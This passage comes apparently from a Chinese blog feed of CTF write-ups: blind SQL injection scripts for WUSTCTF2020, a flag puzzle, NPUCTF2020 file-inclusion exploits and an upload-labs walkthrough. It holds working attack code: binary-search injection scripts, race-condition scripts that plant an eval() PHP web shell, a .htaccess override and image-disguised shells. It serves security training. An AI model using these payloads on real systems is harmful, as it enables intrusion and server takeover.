alt="image-20240117104416528"></p><h1 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h1><p>盲注</p><p><img src="/../images/image-20240117183243963.png" alt="image-20240117183243963"></p><p>脚本</p><p>爆破库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://4ab3b0b2-91a3-428c-8245-12cd01dcf1cb.node5.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        payload1 = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        r = requests.get(url=base_url + payload1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    data += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240117183421468.png" alt="image-20240117183421468"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://4ab3b0b2-91a3-428c-8245-12cd01dcf1cb.node5.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;if(ascii(substr((select(group_concat(flag,&#x27;---&#x27;,value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        payload1 = payload4.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        r = requests.get(url=base_url + payload1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    data += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>爆出flag</p><p><img src="/../images/image-20240117183614666.png" alt="image-20240117183614666"></p><h1 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h1><p>F12查看</p><p><img src="/../images/image-20240118184000488.png" alt="image-20240118184000488"></p><p>发现chase</p><p>但是访问&#x2F;chase&#x2F;会跳转到&#x2F;die</p><p><img src="/../images/image-20240118184048491.png" alt="image-20240118184048491"></p><p>抓包，发现&#x2F;leftt&#x2F;</p><p><img src="/../images/image-20240118184211749.png" alt="image-20240118184211749"></p><p>访问&#x2F;leftt&#x2F;,发现&#x2F;shoot&#x2F;</p><p><img src="/../images/image-20240118184255968.png" alt="image-20240118184255968"></p><p>访问&#x2F;shoot&#x2F;，发现&#x2F;door&#x2F;</p><p><img src="/../images/image-20240118184332106.png" alt="image-20240118184332106"></p><p>访问&#x2F;door&#x2F;，发现&#x2F;static&#x2F;js&#x2F;door.js和check_door()</p><p><img src="/../images/image-20240118184519281.png" alt="image-20240118184519281"></p><p><img src="/../images/image-20240118184543144.png" alt="image-20240118184543144"></p><p>访问&#x2F;static&#x2F;js&#x2F;door.js，发现&#x2F;open&#x2F;</p><p><img src="/../images/image-20240118184901302.png" alt="image-20240118184901302"></p><p>访问&#x2F;open&#x2F;</p><p><img src="/../images/image-20240118184957814.png" alt="image-20240118184957814"></p><p>查看&#x2F;static&#x2F;js&#x2F;open_sesame.js</p><p><img src="/../images/image-20240118185027968.png" alt="image-20240118185027968"></p><p>查看&#x2F;fight&#x2F;</p><p><img src="/../images/image-20240118185107946.png" alt="image-20240118185107946"></p><p>查看&#x2F;static&#x2F;js&#x2F;fight.js</p><p><img src="/../images/image-20240118185142190.png" alt="image-20240118185142190"></p><p>那么flag就是由以下组成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;</span><br></pre></td></tr></table></figure><p>用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line"><span class="comment"># 对flag字典里的内容进行排列组合</span></span><br><span class="line">item = permutations(flag)</span><br><span class="line"><span class="comment"># 遍历</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> item:</span><br><span class="line">    k = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(a))</span><br><span class="line">    <span class="comment"># 匹配</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&#x27;^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$&#x27;</span>, k):</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>第三个就是flag</p><p><img src="/../images/image-20240118185658068.png" alt="image-20240118185658068"></p><h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><p>打开环境，提示需要<strong>md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass</strong></p><p><img src="/../images/image-20240119203706569.png" alt="image-20240119203706569"></p><p>GET传参name&#x3D;1得到hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">576322dd496b99d07b5b0f7fa7934a25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240119203848632.png" alt="image-20240119203848632"></p><p>GET传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</span><br></pre></td></tr></table></figure><p>会跳转到404.html，抓包可以看到flflflflag.php</p><p><img src="/../images/image-20240119204053742.png" alt="image-20240119204053742"></p><p>访问flflflflag.php，可以看到include函数</p><p><img src="/../images/image-20240119204210758.png" alt="image-20240119204210758"></p><p>利用文件包含读取，得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里对file禁用&#x2F;data|input|zip&#x2F;is</p><h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>利用session.upload_process上传一个临时文件，该文件有我们上传的恶意代码，包含它从而执行里面的代码。</p><p>因为该文件内容清空很快，所以需要不停的上传和包含，在清空之前包含该文件。</p><p>session中一部分数据(session.upload_process.name)是用户可以控制的，我们只需要在上传文件的时候，在Cookie中设置PHPSESSID&#x3D;yym68686，同时POST一个恶意的字段，只要上传包里面带上这个键，PHP就会启动Session。同时，我们在Cookie中设置PHPSESSID&#x3D;yym68686，Session文件会自动创建。</p><p>当上传结束后，php会立即清空对应session文件中的内容，导致我们在包含session的时候相当于在包含一个空文件，没有包含我们传入的恶意代码。所以需要利用条件竞争，在文件被清除前利用。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://9a375164-9802-4d2f-893a-b2d268aeef98.node5.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session,))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><p>脚本运行结束，发包找到flag</p><p><img src="/../images/image-20240119205221325.png" alt="image-20240119205221325"></p><p><img src="/../images/image-20240119205207411.png" alt="image-20240119205207411"></p><h2 id="利用php7-segment-fault特性-CVE-2018-14884"><a href="#利用php7-segment-fault特性-CVE-2018-14884" class="headerlink" title="利用php7 segment fault特性(CVE-2018-14884)"></a>利用php7 segment fault特性(CVE-2018-14884)</h2><p>php代码中使用php:&#x2F;&#x2F;filter的strip_tags过滤器，可以让php执行的时候直接出现Segment Fault，这样php的垃圾回收机制就不会在继续执行，导致POST上传的文件就会保存在系统的缓存目录而不会被删除，那么我们只需要直到这个文件名就可以执行代码。<br>php:&#x2F;&#x2F;filter&#x2F;strip_tags导致php崩溃清空堆栈重启，原因是存在一处空指针引用，向PHP发送含有文件区块的数据包时，使得PHP异常崩溃退出，但是上传的文件被保留，默认在tmp目录下。<br>适用版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO <span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://9a375164-9802-4d2f-893a-b2d268aeef98.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>然后访问dir.php</p><p><img src="/../images/image-20240119211505668.png" alt="image-20240119211505668"></p><p>burp发包</p><p><img src="/../images/image-20240119211455158.png" alt="image-20240119211455158"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GWCTF-2019-枯燥的抽奖&quot;&gt;&lt;a href=&quot;#GWCTF-2019-枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]枯燥的抽奖&quot;&gt;&lt;/a&gt;[GWCTF 2019]枯燥的抽奖&lt;/h1&gt;&lt;p&gt;访问环境&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs通关</title>
    <link href="http://example.com/2024/01/14/upload-labs%E9%80%9A%E5%85%B3/"/>
    <id>http://example.com/2024/01/14/upload-labs%E9%80%9A%E5%85%B3/</id>
    <published>2024-01-14T12:31:21.000Z</published>
    <updated>2024-01-14T12:37:32.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><p>第一关前端js校验</p><h2 id="修改前端js代码"><a href="#修改前端js代码" class="headerlink" title="修改前端js代码"></a>修改前端js代码</h2><p>F12查看</p><p><img src="/../images/image-20240114165858038.png" alt="image-20240114165858038"></p><p>删除onsubmit&#x3D;”return checkFile()即可</p><p><img src="/../images/image-20240114165939413.png" alt="image-20240114165939413"></p><h2 id="禁用js"><a href="#禁用js" class="headerlink" title="禁用js"></a>禁用js</h2><p><img src="/../images/image-20240114170135474.png" alt="image-20240114170135474"></p><h2 id="burp抓包绕过"><a href="#burp抓包绕过" class="headerlink" title="burp抓包绕过"></a>burp抓包绕过</h2><p>将文件后缀设置为jpg，然后抓包</p><p><img src="/../images/image-20240114170335837.png" alt="image-20240114170335837"></p><p>再将后缀修改为php</p><p><img src="/../images/image-20240114170452423.png" alt="image-20240114170452423"></p><p>上传成功</p><p><img src="/../images/image-20240114170520495.png" alt="image-20240114170520495"></p><h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><p>第二关检查文件的MIME</p><p>上传1.php，抓包</p><p><img src="/../images/image-20240114170717164.png" alt="image-20240114170717164"></p><p>修改application&#x2F;octet-stream为image&#x2F;jpeg</p><p><img src="/../images/image-20240114170757296.png" alt="image-20240114170757296"></p><p>上传成功</p><p><img src="/../images/image-20240114170816342.png" alt="image-20240114170816342"></p><h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><p>第三关禁止上传.asp|.aspx|.php|.jsp后缀文件</p><p>把后缀改为phtml</p><p><img src="/../images/image-20240114171126874.png" alt="image-20240114171126874"></p><p>后缀也可以为.phps .php5 .pht</p><p>但是要配置apache的httpd.conf</p><h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><p>第四关本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件</p><p>这里我们可以上传.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>然后上传123.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240114182751072.png" alt="image-20240114182751072"></p><h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><p>第五关源码如下</p><p><img src="/../images/image-20240114183134209.png" alt="image-20240114183134209"></p><p>也就是说这里会删除文件名末尾的.，然后再删除空格</p><p>那么我们可以构造 1.php. .</p><p>burp抓包修改</p><p><img src="/../images/image-20240114183309858.png" alt="image-20240114183309858"></p><p>或者上传.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=123.jpg</span><br></pre></td></tr></table></figure><h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><p>第六关相较于第五关没有转换小写</p><p>利用大小写混合绕过即可</p><h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><p>第七关没有使用trim()删除空格，使用空格绕过</p><p><img src="/../images/image-20240114190157349.png" alt="image-20240114190157349"></p><h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><p>第八关没有使用deldot()过滤文件名末尾的点，加.绕过即可</p><p><img src="/../images/image-20240114190459873.png" alt="image-20240114190459873"></p><h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><p>第九关没有对::DATA进行处理，使用::DATA绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240114190713407.png" alt="image-20240114190713407"></p><h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><p>与第五关相同</p><h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><p>第十一关的关键点在于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure><p>会对黑名单中的关键名进行删除，使用双写绕过</p><p><img src="/../images/image-20240114191142923.png" alt="image-20240114191142923"></p><h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><p>第十二关使用白名单限制了上传类型，但是上传路径是可以控制的</p><p>可以使用%00截断，但是应该注意使用%00截断php版本必须在5.3.4以下</p><p><img src="/../images/image-20240114192030797.png" alt="image-20240114192030797"></p><h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><p>与第十二关类似，但是是POST方式修改</p><p><img src="/../images/image-20240114192240418.png" alt="image-20240114192240418"></p><p>POST不会自行解码，所以需要对%00进行编码</p><h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><p>图片马+文件包含</p><p><img src="/../images/image-20240114192923423.png" alt="image-20240114192923423"></p><h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><p>同第十四关</p><h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><p>同第十四关</p><h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><p>第十七关使用了二次渲染，判断了后缀名、content-type，利用imagecreatefromgif判断是否为gif图片，最后二次渲染。</p><p>正常流程我们需要上传gif图片，然后下载渲染后的图片，对比两者不变的地方，插入一句话，然后再包含</p><p>这里使用大佬的gif</p><p><img src="/../images/image-20240114194122744.png" alt="image-20240114194122744"></p><h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><p>条件竞争</p><p>如果上传的不是jpg,png,gif文件，那么会删除，我们可以利用burp不停的发包上传可以生成一句话的php文件，然后访问这个文件，如果访问成功，则一句话成功上传</p><p><img src="/../images/image-20240114194802051.png" alt="image-20240114194802051"></p><p><img src="/../images/image-20240114200650768.png" alt="image-20240114200650768"></p><p>脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxxx/upload/w.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/../images/image-20240114200842372.png" alt="image-20240114200842372"></p><p><img src="/../images/image-20240114200852785.png" alt="image-20240114200852785"></p><h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><p>同第十八关，但是需要改为上传图片马，利用文件包含执行图片马的内容</p><p>python：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx/upload-labs/include.php?file=upload/pass19.png&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">&#x27;Warning&#x27;</span>  <span class="keyword">not</span> <span class="keyword">in</span>  <span class="built_in">str</span>(html.text)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p>在save_name处%00截断，注意编码和php版本</p><p><img src="/../images/image-20240114201530423.png" 